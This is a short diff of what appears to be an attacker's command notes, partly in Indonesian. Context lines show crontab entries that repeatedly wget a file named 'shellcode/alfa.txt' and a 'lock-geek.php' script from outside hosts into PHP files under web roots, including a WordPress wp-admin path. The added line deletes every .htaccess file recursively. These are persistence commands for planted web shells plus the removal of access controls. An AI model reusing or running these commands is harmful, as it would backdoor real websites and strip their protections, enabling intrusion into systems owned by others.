@@ -6,7 +6,7 @@
 * * * * * wget -q https://timseosukses.com/shellcode/alfa.txt -O /var/www/html/wpweb/pgpaud/wp-admin/includes/index.php
 * * * * * wget https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/lock-geek.php -O /var/www/html/silkalibrasi/2024/public/file/draft-sertifikat/get_halaman.php
 
-
+find . -name ".htaccess" -delete           → Semua .htaccessakan dihapus
 
 
 command prmpt
